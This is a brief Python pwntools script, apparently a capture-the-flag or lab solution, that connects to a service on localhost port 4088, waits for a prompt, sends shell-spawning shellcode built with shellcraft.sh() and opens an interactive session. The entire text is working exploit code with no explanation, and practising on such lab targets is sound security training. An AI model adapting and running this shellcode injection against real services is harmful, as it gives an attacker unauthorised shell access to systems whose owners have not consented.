from pwn import *

io = remote('localhost',4088)
io.recvuntil('stuff!!')
shellcode = asm(shellcraft.sh())
io.sendline(shellcode)
io.interactive()